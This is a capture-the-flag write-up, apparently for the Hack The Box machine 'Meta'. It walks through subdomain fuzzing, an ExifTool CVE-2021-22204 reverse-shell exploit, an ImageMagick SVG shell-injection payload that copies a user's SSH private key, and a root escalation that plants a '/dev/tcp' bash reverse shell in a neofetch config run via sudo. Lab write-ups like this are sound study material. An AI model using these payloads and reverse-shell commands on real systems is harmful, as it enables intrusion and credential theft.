## Enumeration

### Rustmap

To use others tools, I found Rustscan which optimizes the scan, by first looking at open ports and then scanning those ports specifically.

```console
❯ rustscan -a 10.10.11.140
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

Read data files from: /usr/bin/../share/nmap

```

If we enter the website through the IP, it will redirect us to `artcorp.htb` which we will have to add to the hosts file.

![error](ip.png) 
_Server Not Found_

To add it to the hosts file we use the following command:

```console
❯ echo "10.10.11.140 artcorp.htb" | sudo tee -a /etc/hosts
```

### Fuzzing

Now we will fuzz the directories using [ffuf](https://github.com/ffuf/ffuf).

```console
❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://artcorp.htb/FUZZ -c -ic

> There are no directories of interest in the domain...

Seeing that there are no interesting directories on the domain, we'll check if it has subdomains again with [ffuf](https://github.com/ffuf/ffuf).

```console
❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://artcorp.htb -H "Host: FUZZ.artcorp.htb" -ic -c -ac

> We found the subdomain `dev01`

To add it to the hosts file we use the following command:

```console
❯ echo "10.10.11.140 dev01.artcorp.htb" | sudo tee -a /etc/hosts
```

### Subdomain

This is the website of the subdomain. You have a link to an application under development.

![dev01](dev01.png)
_Subdomain website_

When entering the metaview directory we find an image metadata reader. If we introduce any image we notice that it returns the following:

![metaview](metaview.png)
_Metaview directory_

> It looks like the output of exiftool...

## Foothold

### Exploit

We will use `searchsploit` to see if there is an exploit for exiftool. We realize that in fact, there is.

```console
❯ searchsploit exiftool
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                        | linux/local/50911.py
----------------------------------------------------------------- ---------------------------------
```

The first step would be to see how the exploit works and to obtain some useful information from [CVE-2021-22204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204).

```console
❯ python /usr/share/exploitdb/exploits/linux/local/50911.py
UNICORD Exploit for CVE-2021-22204

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.
```

> This exploit needs djvulibre-bin and exiftool packages
{: .prompt-info}


In "help" we can see that using the `-s` option generates a payload with a reverse shell.

```console
❯ python /usr/share/exploitdb/exploits/linux/local/50911.py -s 10.10.16.10 4444

        _ __,~~~/_        __  ___  _______________  ___  ___

RUNTIME: DONE - Exploit image written to 'image.jpg
```

In "netcat" which we would have previously left listening, we see how it has worked out and we will be inside as the user `www-data`.

```console
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.140] 33878

$ 
```

> Interactive shell with `script /dev/null -c bash` and use `export TERM=xterm` to not be so restricted.
{: .prompt-tip}

### User Access

After doing a basic enumeration and not finding anything. I decided to use pspy64 to see what processes are running in the background and who is running them.

We found a running script with imagemagick in it and mogrify. 

![pspy64](pspy64.png)
_pspy64_

Then the following is executed, where we see that the root user empties the directory `/var/www/dev01.artcorp.htb/convert_images/`{: .filepath}

![pspy64](place.png)
_pspy64_

Searching for ways to exploit those processes that were running on the background which seemed to be in crontab, I found the following:

[Shell injection](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)

Introducing this payload in the place where it is executed would be a matter of waiting.

```
<image authenticate='ff" `echo $(cat /home/thomas/.ssh/id_rsa)> /dev/shm/0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```
{: file="poc.svg"}

We downloaded the image by setting up a web server with python on our host and using wget on the victim machine pointing to the file.

```console
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ wget 10.10.16.10:8000/poc.svg
--2022-06-04 06:34:06--  http://10.10.16.10:8000/poc.svg
Connecting to 10.10.16.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 428 [image/svg+xml]
Saving to: 'poc.svg'

poc.svg             100%[===================>]     428  --.-KB/s    in 0s      

2022-06-04 06:34:07 (44.8 MB/s) - 'poc.svg' saved [428/428]
```

After a while we will have the file with the output of the command carried out, in this case we have the content of the user's id_rsa.

```console
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/0wned
cat /dev/shm/0wned
-----BEGIN OPENSSH PRIVATE KEY----- 
b3BlbnNzaC1...XJvb3RAbWV0YQE= 
-----END OPENSSH PRIVATE KEY-----
```

And we would already be inside the machine as the user with UID 1000.

```console
❯ ssh -i id_rsa thomas@artcorp.htb
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

```

### Privilege Escalation

I was lucky on the escalation because the first thing I usually do is `sudo -l` and it rarely gives me anything interesting but this time it didn't.

We see how `/usr/bin/neofetch \"\"` can be used without a password. On the other hand we have the environment variable of the configuration directory.

We set the variable to the user's .config directory and insert a reverse shell into the neofetch configuration file. Now all we have to do is run `sudo /usr/bin/neofetch \"\"`.

```console
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
thomas@meta:~$ export XDG_CONFIG_HOME=/home/thomas/.config
thomas@meta:~$ echo "bash -i >& /dev/tcp/10.10.16.10/4444 0>&1" >> .config/neofetch/config.conf
thomas@meta:~$ sudo /usr/bin/neofetch \"\"
```

And we will have access to the system as a root user.

```console
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.140] 47112
root@meta:/home/thomas# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

It is a machine that is "easy" considering that it is of medium difficulty. I guess the difficulty is higher for the downstream user (www-data). I had not dealt with images for this type of processes and I find it interesting.
